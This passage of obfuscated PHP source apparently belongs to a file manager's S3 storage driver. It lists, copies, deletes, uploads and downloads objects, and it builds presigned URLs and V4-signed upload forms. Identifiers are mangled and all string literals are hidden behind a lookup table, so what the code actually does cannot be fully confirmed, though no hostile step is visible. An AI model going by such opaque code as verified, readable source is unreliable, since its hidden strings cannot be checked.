$È¬Ä›Ş—[$§ü¶Ò»Š[88]] = intval($ç’Ÿê[$§ü¶Ò»Š[204]]); } } } $ºÏœ[] = $È¬Ä›Ş—; } return $ºÏœ; } public function slicePath($¦°æ§©Ò) { $×ŒßÃÜÕ =& $_SERVER[©—Ò»ÅĞ]; $«é×Ş¹Í = explode($×ŒßÃÜÕ[8], trim($¦°æ§©Ò, $×ŒßÃÜÕ[8])); $ªê¸¬ê€ = 0; do { ++$ªê¸¬ê€; $õ…¡ØœÙ[] = implode($×ŒßÃÜÕ[8], array_slice($«é×Ş¹Í, 0, $ªê¸¬ê€)) . $×ŒßÃÜÕ[8]; } while ($ªê¸¬ê€ < count($«é×Ş¹Í)); $õ…¡ØœÙ[count($«é×Ş¹Í) - 1] = $¦°æ§©Ò; return $õ…¡ØœÙ; } public function getHost() { $Õè¥éÔõ =& $_SERVER[©—Ò»ÅĞ]; $”¬ÓÌŸí = parse_url(trim($this->domain, $Õè¥éÔõ[8])); $÷«õ™Ö¦ = isset($”¬ÓÌŸí[$Õè¥éÔõ[205]]) ? $”¬ÓÌŸí[$Õè¥éÔõ[205]] : http_type(); $Â¼‹Ë‡î = isset($”¬ÓÌŸí[$Õè¥éÔõ[206]]) ? $”¬ÓÌŸí[$Õè¥éÔõ[206]] : $”¬ÓÌŸí[$Õè¥éÔõ[87]]; if (isset($”¬ÓÌŸí[$Õè¥éÔõ[207]])) { $Â¼‹Ë‡î .= $Õè¥éÔõ[4] . $”¬ÓÌŸí[$Õè¥éÔõ[207]]; } return $÷«õ™Ö¦ . $Õè¥éÔõ[208] . $Â¼‹Ë‡î; } public function pathEncode($’àÏõ¥Ñ) { $Ôğ¿Ôí£ =& $_SERVER[©—Ò»ÅĞ]; return str_replace($Ôğ¿Ôí£[209], $Ôğ¿Ôí£[8], rawurlencode($’àÏõ¥Ñ)); } public function writeLog($§‰ºÒè‚ = '', $¶’¤¹·Ó = false) { $™¹¬¶ú =& $_SERVER[©—Ò»ÅĞ]; $Å’àğİÂ = in_array(ACTION, array($™¹¬¶ú[210], $™¹¬¶ú[211])); if (!$Å’àğİÂ && !GLOBAL_DEBUG) { return; } $¤î¦À²– = $§‰ºÒè‚; static $ÄÂ‰’¼ = null; if (!$ÄÂ‰’¼) { $ÄÂ‰’¼ = strtoupper($this->getType()); } $§‰ºÒè‚ = $ÄÂ‰’¼ . $™¹¬¶ú[212] . $§‰ºÒè‚; if ($¶’¤¹·Ó) { $üıßÂ© = error_get_last(); if ($üıßÂ©) { $§‰ºÒè‚ = array($§‰ºÒè‚, $üıßÂ©); } } write_log($§‰ºÒè‚, $™¹¬¶ú[213]); if ($Å’àğİÂ) { throw new Exception($¤î¦À²–); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($§ú¤€°‰) { set_timeout(); require_once SDK_DIR . $_SERVER[©—Ò»ÅĞ][214]; parent::__construct(); $this->_init($§ú¤€°‰); } public function _init($Ÿ¢…¶”œ) { $­ïòœ¶‹ =& $_SERVER[©—Ò»ÅĞ]; $this->config = $Ÿ¢…¶”œ; foreach ($Ÿ¢…¶”œ as $¾˜‘ˆŞû => $”ı¤óÌ) { if (isset($this->{$¾˜‘ˆŞû})) { $this->{$¾˜‘ˆŞû} = $”ı¤óÌ; } } $this->endpoint = $Ÿ¢…¶”œ[$­ïòœ¶‹[215]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $Ô¨ìÈ•Ğ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($Ô¨ìÈ•Ğ, 0, 7) == $­ïòœ¶‹[216]) { $Ô¨ìÈ•Ğ = $­ïòœ¶‹[217] . substr($Ô¨ìÈ•Ğ, 7); } $this->client->setEndpoint($Ô¨ìÈ•Ğ); if (in_array(ACTION, array($­ïòœ¶‹[210], $­ïòœ¶‹[211]))) { $this->client->setExceptions(); } } public function setSignVersion($€–ì«ğ» = "\x76\64") { $this->signVer = $€–ì«ğ»; $this->client->setSignVersion($€–ì«ğ»); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ËÒ—ø¿è) { return null; } } public function isBucketCors() { $›İÎ’äˆ =& $_SERVER[©—Ò»ÅĞ]; $ıêöŠğã = $this->getBucketCors(); if (!$ıêöŠğã || !is_array($ıêöŠğã)) { return !1; } if (!is_array($ıêöŠğã[$›İÎ’äˆ[218]])) { $ıêöŠğã[$›İÎ’äˆ[218]] = explode($›İÎ’äˆ[50], $ıêöŠğã[$›İÎ’äˆ[218]]); } if ($ıêöŠğã[$›İÎ’äˆ[219]] != $›İÎ’äˆ[220] || !in_array($›İÎ’äˆ[220], $ıêöŠğã[$›İÎ’äˆ[218]])) { return !1; } $Ú«¸Á÷‰ = array_map($›İÎ’äˆ[221], $ıêöŠğã[$›İÎ’äˆ[222]]); if (!is_array($Ú«¸Á÷‰)) { $Ú«¸Á÷‰ = array(); } $â‹‘òıê = array($›İÎ’äˆ[223], $›İÎ’äˆ[224], $›İÎ’äˆ[225], $›İÎ’äˆ[226], $›İÎ’äˆ[227]); $şÅ¬ÎˆË = array_diff($â‹‘òıê, $Ú«¸Á÷‰); return empty($şÅ¬ÎˆË); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function setRegion($ÙûêÉ) { return $this->client->setRegion($ÙûêÉ); } public function mkfile($±ë÷¦â, $·…ÏŒäß = '', $öü¡ıÕî = REPEAT_RENAME) { $¥şÙğ¦ó = $this->setContent($±ë÷¦â, $·…ÏŒäß); if ($¥şÙğ¦ó !== !1) { return $this->getPathOuter($±ë÷¦â); } return !1; } public function mkdir($šËì—ûë, $Ü¼ş©¬” = REPEAT_SKIP) { $×¼Ã°µİ =& $_SERVER[©—Ò»ÅĞ]; if (empty($šËì—ûë) && $šËì—ûë !== $×¼Ã°µİ[228]) { return !1; } if ($Ü¼ş©¬” && $this->_isFolder($šËì—ûë)) { return $this->getPathOuter($šËì—ûë); } $“ÁÜÓ±Å = $this->setContent($šËì—ûë, $×¼Ã°µİ[12], !0); if ($“ÁÜÓ±Å !== !1) { return $this->getPathOuter($šËì—ûë); } return !1; } public function copyFile($İÚòÉ», $Éú´Õó, $ÄÆÏ€÷ë = array()) { $ÏÇÀ’Ôƒ =& $_SERVER[©—Ò»ÅĞ]; $ÅÌŒ‘ŠÜ = $this->objectMeta($İÚòÉ»); if (!$ÅÌŒ‘ŠÜ) { return !1; } if ($ÅÌŒ‘ŠÜ[$ÏÇÀ’Ôƒ[79]] <= 1024 * 1024 * 200) { $€ãõè = $this->client->copyObject($this->bucket, $İÚòÉ», $this->bucket, $Éú´Õó, $ÏÇÀ’Ôƒ[229], $ÄÆÏ€÷ë); } else { $€ãõè = $this->client->multiCopyObject($this->bucket, $İÚòÉ», $this->bucket, $Éú´Õó, $ÄÆÏ€÷ë); } $€ãõè = $€ãõè ? $this->getPathOuter($Éú´Õó) : !1; return $€ãõè; } public function moveFile($¢÷Á³ÂÓ, $£Áææåé) { if ($this->copyFile($¢÷Á³ÂÓ, $£Áææåé)) { $this->delFile($¢÷Á³ÂÓ); return $this->getPathOuter($£Áææåé); } return !1; } public function delFile($Ê²Ç¥ƒ) { return $this->client->deleteObject($this->bucket, $Ê²Ç¥ƒ); } public function delFolder($Ü—¯­×µ) { $ËåÒ­¡“ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->exist($Ü—¯­×µ)) { return !0; } $this->listItemCache = !1; $¢¦şşõ‚ = $this->fileList($Ü—¯­×µ); $this->listItemCache = !0; $¥©Óâ¨İ = trim($Ü—¯­×µ, $ËåÒ­¡“[8]) . $ËåÒ­¡“[8]; if (!empty($Ü—¯­×µ) && $Ü—¯­×µ !== $ËåÒ­¡“[228] && !in_array($¥©Óâ¨İ, $¢¦şşõ‚[$ËåÒ­¡“[85]])) { $¢¦şşõ‚[$ËåÒ­¡“[85]][] = $¥©Óâ¨İ; } $è­Úú˜Œ = $this->delByBatch($¢¦şşõ‚[$ËåÒ­¡“[86]]); if (!$è­Úú˜Œ) { return !1; } $è­Úú˜Œ = $this->delByBatch($¢¦şşõ‚[$ËåÒ­¡“[85]]); if (!$è­Úú˜Œ) { return !1; } return $this->delFile($¥©Óâ¨İ); } private function delByBatch($ßşÆ¸¥ú) { foreach (array_chunk($ßşÆ¸¥ú, 1000) as $‹ìşÅ¯º) { $¹¯Ş›¼ = $this->client->deleteObjects($this->bucket, $‹ìşÅ¯º); if (!$¹¯Ş›¼) { return !1; } } return !0; } public function rename($ÎÕÇÙÜó, $Ñ¦æË‚§) { return $this->renameObject($ÎÕÇÙÜó, $Ñ¦æË‚§); } public function listPath($ìÖ¦å­À, $•§âÄ = false) { $ ¤Ûêëã =& $_SERVER[©—Ò»ÅĞ]; $–¬ç—€” = $this->fileList($ìÖ¦å­À, $ ¤Ûêëã[8], !0); foreach ($–¬ç—€”[$ ¤Ûêëã[85]] as $Ò‘•›‡¤ => $Ë¢Ï˜…Ó) { $–¬ç—€”[$ ¤Ûêëã[85]][$Ò‘•›‡¤] = $this->folderInfo($Ë¢Ï˜…Ó, $•§âÄ, $Ë¢Ï˜…Ó); } foreach ($–¬ç—€”[$ ¤Ûêëã[86]] as $Ò‘•›‡¤ => $Ë¢Ï˜…Ó) { $–¬ç—€”[$ ¤Ûêëã[86]][$Ò‘•›‡¤] = $this->fileInfo($Ë¢Ï˜…Ó[$ ¤Ûêëã[32]], $•§âÄ, $Ë¢Ï˜…Ó); } return $–¬ç—€”; } protected function infoChildren($£¿ÇÛÓ, &$«Ê¡Ãù) { $¯Ö¦ÉÂ =& $_SERVER[©—Ò»ÅĞ]; $ÍôÉÕÕ = $this->fileList($£¿ÇÛÓ, $¯Ö¦ÉÂ[12], !0); $«Ê¡Ãù[$¯Ö¦ÉÂ[81]] += count($ÍôÉÕÕ[$¯Ö¦ÉÂ[85]]); $«Ê¡Ãù[$¯Ö¦ÉÂ[80]] += count($ÍôÉÕÕ[$¯Ö¦ÉÂ[86]]); foreach ($ÍôÉÕÕ[$¯Ö¦ÉÂ[86]] as $µÏ×Ô³») { if (!$µÏ×Ô³» || !$µÏ×Ô³»[$¯Ö¦ÉÂ[79]]) { continue; } $«Ê¡Ãù[$¯Ö¦ÉÂ[79]] += $µÏ×Ô³»[$¯Ö¦ÉÂ[79]]; } } private function fileInfo($îı±„Õ³, $áö¨€ç = false, $€ÏØŞ™ = array()) { $½µö•› =& $_SERVER[©—Ò»ÅĞ]; $‹Òî©ª¹ = array($½µö•›[32] => $this->pathThis($îı±„Õ³), $½µö•›[87] => $this->getPathOuter($îı±„Õ³), $½µö•›[33] => $½µö•›[230], $½µö•›[166] => $this->ext($îı±„Õ³), $½µö•›[79] => isset($€ÏØŞ™[$½µö•›[79]]) ? $€ÏØŞ™[$½µö•›[79]] : 0); if ($áö¨€ç) { return $‹Òî©ª¹; } $‹Òî©ª¹[$½µö•›[231]] = $‹Òî©ª¹[$½µö•›[88]] = 0; $‹Òî©ª¹[$½µö•›[232]] = $‹Òî©ª¹[$½µö•›[233]] = !0; if (empty($€ÏØŞ™)) { $€ÏØŞ™ = $this->objectMeta($îı±„Õ³); if (!$€ÏØŞ™) { return $‹Òî©ª¹; } } if (isset($€ÏØŞ™[$½µö•›[234]]) && $€ÏØŞ™[$½µö•›[234]]) { $‹Òî©ª¹[$½µö•›[235]] = $€ÏØŞ™[$½µö•›[234]]; } if (isset($€ÏØŞ™[$½µö•›[204]])) { $‹Òî©ª¹[$½µö•›[88]] = $€ÏØŞ™[$½µö•›[204]]; } if (isset($€ÏØŞ™[$½µö•›[79]])) { $‹Òî©ª¹[$½µö•›[79]] = $€ÏØŞ™[$½µö•›[79]]; } return $‹Òî©ª¹; } private function folderInfo($øŞÁ¡, $ôƒÅÏªù = false, $´Ó»á™Ì = array()) { $ÑèÛıæä =& $_SERVER[©—Ò»ÅĞ]; $‰½ª±®© = array($ÑèÛıæä[32] => $this->pathThis($øŞÁ¡), $ÑèÛıæä[87] => $this->getPathOuter($ÑèÛıæä[8] . $øŞÁ¡), $ÑèÛıæä[33] => $ÑèÛıæä[78]); if ($ôƒÅÏªù) { return $‰½ª±®©; } $‰½ª±®©[$ÑèÛıæä[231]] = $‰½ª±®©[$ÑèÛıæä[88]] = 0; $‰½ª±®©[$ÑèÛıæä[232]] = $‰½ª±®©[$ÑèÛıæä[233]] = !0; if ($øŞÁ¡ == $ÑèÛıæä[12]) { return $‰½ª±®©; } if (empty($´Ó»á™Ì)) { $´Ó»á™Ì = $this->objectMeta(trim($øŞÁ¡, $ÑèÛıæä[8]) . $ÑèÛıæä[8]); } if (isset($´Ó»á™Ì[$ÑèÛıæä[204]])) { $‰½ª±®©[$ÑèÛıæä[231]] = $´Ó»á™Ì[$ÑèÛıæä[204]]; } return $‰½ª±®©; } private function fileList($î˜¨ª, $Ğ•Öšé¨ = '', $ä•’ß¤ø = 0) { $ûØŠ¯ =& $_SERVER[©—Ò»ÅĞ]; $‡‰Œï¢õ = rtrim($î˜¨ª, $ûØŠ¯[8]) . $ûØŠ¯[8]; $ÊòşğñÄ = $this->listObjs($‡‰Œï¢õ, null, null, $Ğ•Öšé¨); if (!$ÊòşğñÄ) { return array($ûØŠ¯[85] => array(), $ûØŠ¯[86] => array()); } $ùë«Â›‡ = $”Âæƒ†İ = array(); foreach ($ÊòşğñÄ[$ûØŠ¯[236]] as $ãŠÓöê) { $µò€°Š· = $ãŠÓöê[$ûØŠ¯[32]]; if ($µò€°Š· == $‡‰Œï¢õ) { continue; } $úÖÓÒ¨ü = isset($ãŠÓöê[$ûØŠ¯[79]]) ? $ãŠÓöê[$ûØŠ¯[79]] : 0; $™¼÷ÃªØ = $úÖÓÒ¨ü == 0 && substr($µò€°Š·, strlen($µò€°Š·) - 1, 1) == $ûØŠ¯[8] ? !0 : !1; $this->cacheMethodInfoSet($µò€°Š·, $™¼÷ÃªØ, $ãŠÓöê); if ($™¼÷ÃªØ) { $ùë«Â›‡[] = $µò€°Š·; continue; } $”Âæƒ†İ[] = $ä•’ß¤ø ? $ãŠÓöê : $µò€°Š·; } foreach ($ÊòşğñÄ[$ûØŠ¯[237]] as $ãŠÓöê) { $ùë«Â›‡[] = $ãŠÓöê[$ûØŠ¯[32]]; $this->cacheMethodInfoSet($ãŠÓöê[$ûØŠ¯[32]], !0); } $this->cacheMethodInfoSet($î˜¨ª, !0); return array($ûØŠ¯[85] => $ùë«Â›‡, $ûØŠ¯[86] => $”Âæƒ†İ); } private function listObjs($¯áœ¬, $¾û¬Õ = null, $Ó„‘ ©ˆ = null, $…øÏì¾´ = null) { $éÍ¨­à =& $_SERVER[©—Ò»ÅĞ]; $¯áœ¬ = trim($¯áœ¬, $éÍ¨­à[8]); $¡…¶™Ç¹ = empty($¯áœ¬) && $¯áœ¬ !== $éÍ¨­à[228] ? $éÍ¨­à[12] : $¯áœ¬ . $éÍ¨­à[8]; return $this->client->getBucket($this->bucket, $¡…¶™Ç¹, $¾û¬Õ, $Ó„‘ ©ˆ, $…øÏì¾´, !0); } public function has($»¨¯€—Õ, $©§÷ß‚Ê = false, $ÃçÂƒ¯¼ = true) { $ıÍ™¶¬Ó =& $_SERVER[©—Ò»ÅĞ]; $»¨¯€—Õ = trim($»¨¯€—Õ, $ıÍ™¶¬Ó[8]); $šìÕŞ¬İ = empty($»¨¯€—Õ) && $»¨¯€—Õ !== $ıÍ™¶¬Ó[228] ? $ıÍ™¶¬Ó[12] : $»¨¯€—Õ . $ıÍ™¶¬Ó[8]; $Şğ­·ÕÉ = null; $€ÄªË¸Â = 500; $à«ß‹Ù = $ıÍ™¶¬Ó[8]; $¹î¡É‚ª = $Æï‚‡íã = array(); while (!0) { $Ãøè¹İõ = $this->listObjs($»¨¯€—Õ, $Şğ­·ÕÉ, $€ÄªË¸Â, $à«ß‹Ù); if (!$Ãøè¹İõ) { break; } $Şğ­·ÕÉ = $Ãøè¹İõ[$ıÍ™¶¬Ó[238]]; $çÃïöÈˆ = $Ãøè¹İõ[$ıÍ™¶¬Ó[236]]; $ğë¨Ì† = $Ãøè¹İõ[$ıÍ™¶¬Ó[237]]; if (empty($çÃïöÈˆ) && empty($ğë¨Ì†)) { break; } if (count($çÃïöÈˆ) == 1 && $çÃïöÈˆ[0][$ıÍ™¶¬Ó[32]] == $šìÕŞ¬İ) { break; } if ($©§÷ß‚Ê) { if (count($çÃïöÈˆ)) { $çÃïöÈˆ = array_column($çÃïöÈˆ, $ıÍ™¶¬Ó[32]); $¹î¡É‚ª = array_merge($¹î¡É‚ª, $çÃïöÈˆ); } if (count($ğë¨Ì†)) { $ğë¨Ì† = array_column($ğë¨Ì†, $ıÍ™¶¬Ó[32]); $Æï‚‡íã = array_merge($Æï‚‡íã, $ğë¨Ì†); } if ($Şğ­·ÕÉ === null) { break; } continue; } if ($ÃçÂƒ¯¼) { if (!empty($çÃïöÈˆ)) { if (count($çÃïöÈˆ) > 1 || isset($çÃïöÈˆ[0][$ıÍ™¶¬Ó[32]]) && $çÃïöÈˆ[0][$ıÍ™¶¬Ó[32]] != $šìÕŞ¬İ) { return !0; } } } else { if (!empty($ğë¨Ì†)) { return !0; } } if ($Şğ­·ÕÉ === null) { break; } } if ($©§÷ß‚Ê) { $¹î¡É‚ª = array_diff($¹î¡É‚ª, array($šìÕŞ¬İ)); $¹î¡É‚ª = count(array_unique($¹î¡É‚ª)); $Æï‚‡íã = count(array_unique($Æï‚‡íã)); return array($ıÍ™¶¬Ó[239] => $¹î¡É‚ª, $ıÍ™¶¬Ó[240] => $Æï‚‡íã); } return !1; } public function listAll($ğ­•úÊ¨) { $Ø…Â¶× =& $_SERVER[©—Ò»ÅĞ]; $›£¥ÔŸ« = $this->fileList($ğ­•úÊ¨, $Ø…Â¶×[12], !0); $å«à·ßò = array_to_keyvalue($›£¥ÔŸ«[$Ø…Â¶×[86]], $Ø…Â¶×[32]); foreach ($›£¥ÔŸ«[$Ø…Â¶×[85]] as $ã‰öçôš) { if (is_string($ã‰öçôš)) { $å«à·ßò[$ã‰öçôš] = array($Ø…Â¶×[79] => 0); } } return $this->listAllFiles($ğ­•úÊ¨, $å«à·ßò); } public function canRead($…Æç·šø) { $ççóİ÷¤ =& $_SERVER[©—Ò»ÅĞ]; $·¶Á¯š = $this->client->getAccessControlPolicy($this->bucket, $…Æç·šø); if (!$·¶Á¯š) { return !1; } return in_array($·¶Á¯š, array($ççóİ÷¤[241], $ççóİ÷¤[242], $ççóİ÷¤[243])) ? !0 : !1; } public function canWrite($¨÷ğàÈĞ) { $×é©ô£ã =& $_SERVER[©—Ò»ÅĞ]; $ÅßáÓñÑ = $this->client->getAccessControlPolicy($this->bucket, $¨÷ğàÈĞ); if (!$ÅßáÓñÑ) { return !1; } return in_array($ÅßáÓñÑ, array($×é©ô£ã[241], $×é©ô£ã[242])) ? !0 : !1; } public function getContent($‰Íšà) { return $this->client->getObject($this->bucket, $‰Íšà); } public function setContent($ÁùÑ¡Â¯, $›“¹òàÍ = '', $©Ù­Ö“¹ = false) { $¼ş•…ÈÇ =& $_SERVER[©—Ò»ÅĞ]; $ÁùÑ¡Â¯ = $©Ù­Ö“¹ ? trim($ÁùÑ¡Â¯, $¼ş•…ÈÇ[8]) . $¼ş•…ÈÇ[8] : $ÁùÑ¡Â¯; $è”í‡·ü = get_file_mime(get_path_ext($ÁùÑ¡Â¯)); $åŠı´¿¹ = $this->client->putObject($›“¹òàÍ, $this->bucket, $ÁùÑ¡Â¯, $¼ş•…ÈÇ[229], array(), $è”í‡·ü); if (!$åŠı´¿¹) { return !1; } if ($©Ù­Ö“¹) { return !0; } return $åŠı´¿¹ ? !0 : !1; } public function fileSubstr($çÊ‘â®Ú, $˜¸Ñ¸¾, $Å—åÆõÊ) { $åş¡˜«Ç = $˜¸Ñ¸¾ + $Å—åÆõÊ - 1; return $this->client->getObject($this->bucket, $çÊ‘â®Ú, array($_SERVER[©—Ò»ÅĞ][244] => "\x62\171\x74\x65\x73\75{$˜¸Ñ¸¾}\55{$åş¡˜«Ç}")); } public function upload($İœê¡—, $Ÿ„Ÿ€¢ó, $âúéÁÊ¨ = false, $€ÂÏØ‘û = REPEAT_REPLACE) { $‹™¸ùƒ¾ =& $_SERVER[©—Ò»ÅĞ]; if (!$Ÿ„Ÿ€¢ó || !@file_exists($Ÿ„Ÿ€¢ó)) { return !1; } $æî§âò = array($‹™¸ùƒ¾[245] => @md5_file($Ÿ„Ÿ€¢ó)); $×ÖÈùÅ = array($‹™¸ùƒ¾[246] => get_file_mime(get_path_ext($İœê¡—))); if (IO::size($Ÿ„Ÿ€¢ó) <= 1024 * 1024 * 200) { $ßäÍãËÌ = $this->client->putObjectFile($Ÿ„Ÿ€¢ó, $this->bucket, $İœê¡—, $‹™¸ùƒ¾[229], $æî§âò, $×ÖÈùÅ); return !empty($ßäÍãËÌ) ? $this->getPathOuter($İœê¡—) : !1; } $íÌÙ‹‹€ = $this->client->multiUploadObject($Ÿ„Ÿ€¢ó, $this->bucket, trim($İœê¡—, $‹™¸ùƒ¾[8]), $æî§âò, $×ÖÈùÅ); return $íÌÙ‹‹€ ? $this->getPathOuter($İœê¡—) : !1; } public function download($û©¿òÃ, $¹ªç‰õÆ) { if (!@is_dir($this->pathFather($¹ªç‰õÆ)) && !IO::mkdir($this->pathFather($¹ªç‰õÆ))) { return !1; } $ŠÔ´¬¥ = $this->client->getObject($this->bucket, $û©¿òÃ, array(), $¹ªç‰õÆ); return $ŠÔ´¬¥ !== !1 ? $¹ªç‰õÆ : !1; } public function link($Ïòç€ª¶, $éèŸ‚ùœ = array()) { return $this->getPreSignedURL($Ïòç€ª¶, 3600 * 12, $éèŸ‚ùœ); } private function getPreSignedURL($ë±ËæÄ·, $¿æú£¦ı, $ÄØ«±ã = array(), $ıú€˜îå = "\x47\x45\124") { $Ä‚×úşæ =& $_SERVER[©—Ò»ÅĞ]; $ë±ËæÄ· = trim($ë±ËæÄ·, $Ä‚×úşæ[8]); if ($this->signVer == $Ä‚×úşæ[247]) { return $this->client->getPreSignedV2URL($this->bucket, $ë±ËæÄ·, $¿æú£¦ı, $ıú€˜îå, $ÄØ«±ã); } return $this->client->getPreSignedV4URL($this->bucket, $ë±ËæÄ·, $¿æú£¦ı, array(), $ıú€˜îå, $ÄØ«±ã); } public function fileOut($ÁÖ·†ƒÚ, $ò²şúø¯ = false, $ô´¨²éí = false, $ŸÍºÌÊ¬ = '') { $ùéôãÍ« =& $_SERVER[©—Ò»ÅĞ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÁÖ·†ƒÚ, $ò²şúø¯, $ô´¨²éí, $ŸÍºÌÊ¬); } if (!$ô´¨²éí) { $ô´¨²éí = $this->pathThis($ÁÖ·†ƒÚ); } $¥Ä€¸‚æ = get_file_mime(get_path_ext($ô´¨²éí)); if ($¥Ä€¸‚æ == $ùéôãÍ«[248]) { return parent::fileOut($ÁÖ·†ƒÚ, $ò²şúø¯, $ô´¨²éí, $ŸÍºÌÊ¬); } $¿ÕÕ½°‰ = array($ùéôãÍ«[249] => $¥Ä€¸‚æ); if ($ò²şúø¯) { $¿ÕÕ½°‰[$ùéôãÍ«[250]] = $ùéôãÍ«[251] . rawurlencode($ô´¨²éí); } else { } $ôæ¿Õô = $this->link($ÁÖ·†ƒÚ, $¿ÕÕ½°‰); $this->fileOutLink($ôæ¿Õô); } public function fileOutServer($•ä‡Ç¥ğ, $‚¶£™Œé = false, $ÔßÏÚØ¸ = false, $åŠµßôÅ = '') { parent::fileOut($•ä‡Ç¥ğ, $‚¶£™Œé, $ÔßÏÚØ¸, $åŠµßôÅ); } public function fileOutImageServer($îî£à, $˜ì¦³‡Û = 250) { parent::fileOutImage($îî£à, $˜ì¦³‡Û); } public function fileOutLink($íâØàâÍ) { $£Ë­Å±å =& $_SERVER[©—Ò»ÅĞ]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($£Ë­Å±å[67], $£Ë­Å±å[66], $£Ë­Å±å[68])) && !get_url_scheme($this->endpoint) && substr($íâØàâÍ, 0, 7) == $£Ë­Å±å[216]) { $íâØàâÍ = $£Ë­Å±å[217] . substr($íâØàâÍ, 7); } header($£Ë­Å±å[172] . $íâØàâÍ); die; } public function hashMd5($²„± , $äÙº…‡ = '') { $Áïô·­ = $this->objectMeta($²„± ); if (!$Áïô·­) { return !1; } $äÙº…‡ = $äÙº…‡ ? $äÙº…‡ : _get($Áïô·­, $_SERVER[©—Ò»ÅĞ][252]); return $äÙº…‡; } public function uploadFormData($ÉœªÛ, $§»ºŞ«’ = 3600) { $†õæÇŞ„ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->_isClientAsync()) { $¹ü­ö–Û = $this->getPreSignedURL($ÉœªÛ, $§»ºŞ«’, array(), $†õæÇŞ„[253]); return array($†õæÇŞ„[206] => str_replace($†õæÇŞ„[216], $†õæÇŞ„[254], $¹ü­ö–Û)); } if (isset($GLOBALS[$†õæÇŞ„[6]][$†õæÇŞ„[92]][$†õæÇŞ„[255]]) && $GLOBALS[$†õæÇŞ„[6]][$†õæÇŞ„[92]][$†õæÇŞ„[255]] == $†õæÇŞ„[228]) { return $this->uploadMultiData($ÉœªÛ, $§»ºŞ«’); } if ($this->signVer == $†õæÇŞ„[247]) { return $this->uploadFormDataV2($ÉœªÛ, $§»ºŞ«’); } return $this->uploadFormDataV4($ÉœªÛ, $§»ºŞ«’); } public function uploadFormDataV2($¡Ò¾î¿ú, $ÉóîÈ†ù = 3600) { $£º››  =& $_SERVER[©—Ò»ÅĞ]; $¢¹™ºİ = $this->pathFather($¡Ò¾î¿ú); $ÁûÏ­íõ = $this->client->getHttpUploadPostParams($this->bucket, $¢¹™ºİ, $£º›› [229], $ÉóîÈ†ù); $›Ñ¤œ¦á = array_merge((array) $ÁûÏ­íõ, array($£º›› [256] => $£º›› [247], $£º›› [206] => $this->getHost())); if ($this->_isClientAsync()) { unset($›Ñ¤œ¦á[$£º›› [256]]); } return $›Ñ¤œ¦á; } public function uploadFormDataV4($®Ï™ÂÖ», $Üµëêüñ = 3600) { $Ê¤çÍãÑ =& $_SERVER[©—Ò»ÅĞ]; $ïîÀÂ× = $Ê¤çÍãÑ[229]; $Ü§ÃÌØ— = $Ê¤çÍãÑ[257]; $®Íİõ† = $Ê¤çÍãÑ[62]; $ÅÁÏŸ‘é = gmdate($Ê¤çÍãÑ[258]); $ÇìÉóóØ = gmdate($Ê¤çÍãÑ[259]); $ ëÚ‹Ûö = $Ê¤çÍãÑ[260]; $ü±‹ìÜ“ = $Üµëêüñ . $Ê¤çÍãÑ[12]; $üóí¸… = $Ê¤çÍãÑ[261]; $Íà™ÊÃÖ = array($this->accessKey, $ÇìÉóóØ, $this->region, $®Íİõ†, $ ëÚ‹Ûö); $ü½£À‚¸ = implode($Ê¤çÍãÑ[8], $Íà™ÊÃÖ); $„ŸºŒí’ = array($Ê¤çÍãÑ[262] => gmdate($Ê¤çÍãÑ[263], strtotime($Ê¤çÍãÑ[264])), $Ê¤çÍãÑ[265] => array(array($Ê¤çÍãÑ[266] => $this->bucket), array($Ê¤çÍãÑ[267], $Ê¤çÍãÑ[268], $Ê¤çÍãÑ[12]), array($Ê¤çÍãÑ[267], $Ê¤çÍãÑ[269], $Ê¤çÍãÑ[12]), array($Ê¤çÍãÑ[270] => $üóí¸…), array($Ê¤çÍãÑ[271] => $ü½£À‚¸), array($Ê¤çÍãÑ[272] => $Ü§ÃÌØ—), array($Ê¤çÍãÑ[273] => $ÅÁÏŸ‘é), array($Ê¤çÍãÑ[274] => $ü±‹ìÜ“))); $°Çá½Ûõ = base64_encode(json_encode($„ŸºŒí’)); $€Î¯ßŠ— = hash_hmac($Ê¤çÍãÑ[275], $ÇìÉóóØ, $Ê¤çÍãÑ[276] . $this->secret, !0); $ŸÅ÷‰ø = hash_hmac($Ê¤çÍãÑ[275], $this->region, $€Î¯ßŠ—, !0); $ş±ÄÀœ¨ = hash_hmac($Ê¤çÍãÑ[275], $®Íİõ†, $ŸÅ÷‰ø, !0); $Û·‰™°ı = hash_hmac($Ê¤çÍãÑ[275], $ ëÚ‹Ûö, $ş±ÄÀœ¨, !0); $ªú’Ûıˆ = hash_hmac($Ê¤çÍãÑ[275], $°Çá½Ûõ, $Û·‰™°ı); $æ¶Ÿâ†… = array($Ê¤çÍãÑ[246] => $Ê¤çÍãÑ[12], $Ê¤çÍãÑ[270] => $üóí¸…, $Ê¤çÍãÑ[277] => $°Çá½Ûõ, $Ê¤çÍãÑ[271] => $ü½£À‚¸, $Ê¤çÍãÑ[272] => $Ü§ÃÌØ—, $Ê¤çÍãÑ[273] => $ÅÁÏŸ‘é, $Ê¤çÍãÑ[274] => $ü±‹ìÜ“, $Ê¤çÍãÑ[278] => $ªú’Ûıˆ, $Ê¤çÍãÑ[256] => $Ê¤çÍãÑ[247], $Ê¤çÍãÑ[206] => $this->getHost()); if ($this->_isClientAsync()) { unset($æ¶Ÿâ†…[$Ê¤çÍãÑ[256]]); } return $æ¶Ÿâ†…; } public function uploadMultiData($µ®²¦Û, $Ì®œÃÚ† = 3600) { $º½½Ø´ =& $_SERVER[©—Ò»ÅĞ]; $ĞŸ¢ƒ½ = $this->signVer == $º½½Ø´[247] ? gmdate($º½½Ø´[279]) : gmdate($º½½Ø´[280]); $ÌÈÔÊèÉ = array(); $êò ¶Ä = $this->client->getUploadId($this->bucket, $µ®²¦Û, $ÌÈÔÊèÉ); if (!$êò 